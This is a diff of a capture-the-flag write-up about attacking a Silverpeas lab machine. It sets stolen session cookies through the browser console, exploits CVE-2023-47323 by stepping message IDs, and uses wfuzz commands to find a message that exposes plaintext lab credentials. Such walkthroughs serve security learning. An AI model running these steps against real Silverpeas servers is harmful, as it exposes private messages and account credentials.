@@ -150,13 +150,15 @@ Set-Cookie: svpLogin=scr1ptkiddy; path=/; ...
 
 Notice that the server returned the following URL value in the `Location` header:
 
-`http://<target-url>:8080/silverpeas/look/jsp/MainFrame.jsp`
+`http://<target-url>:8080/silverpeas/Main//look/jsp/MainFrame.jsp`
 
 
 
 The following cookies are found from the `Set-Cookie` response headers from the request above, and must be set in the browser (under the _**Console**_ tab for Google Chrome) for the dashboard to load. If not set, the page will redirect back to the login page:
 
 ```javascript
+
+
 chrome-console> document.cookie = "JSESSIONID=xxx; path=/silverpeas; HttpOnly";
 chrome-console> document.cookie = "defaultDomain=0; path=/; ...";
 chrome-console> document.cookie = "svpLogin=scr1ptkiddy; path=/; ...";
@@ -178,18 +180,47 @@ Host: <target-url>:8080
 Login=Manager&DomainId=0
 ```
 
+**New URL**: `http://<target-url>:8080/silverpeas/look/jsp/MainFrame.jsp`
 
 
-`http://<target-url>:8080/silverpeas/Main//look/jsp/MainFrame.jsp`
 
-\
-After looking around the website, ...
+The following credentials were found using a few methods:
 
 `tim`&#x20;
 
 `cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol`
 
 
+
+**Method 1: CVE 2023-47323**
+
+{% embed url="https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323" %}
+
+After iterating through the URL with different ID values, I found that the ID value of _**6**_ displays the credentials:
+
+`http://10.10.105.62:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6`\
+
+
+**Testing the results with wfuzz:**
+
+```bash
+$ wfuzz -u "http://<target-url>:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=FUZZ" -H "Cookie: JSESSIONID=xxx; path=/silverpeas; HttpOnly; defaultDomain=0; path=/; ... svpLogin=scr1ptkiddy; path=/; ..."
+```
+
+The results from wfuzz showed a bunch of results with the content length (under the _**Chars**_ header in the output) of **13201** and **13202**. Thus, I decided to filter the results to only show those response with more than **13202** characters. (using the `--filter` flag):
+
+```bash
+$ wfuzz ... --filter "h>13202"
+
+# further filter can be made with value 13760
+$ wfuzz ... --filter "h>13760"
+```
+
+The results will either display 2-3 responses, or a single response. By now, it should be clear from the results that the payload value of _**6**_ have the highest content length.&#x20;
+
+
+
+**Method 2: CVE-...**
 
 
 
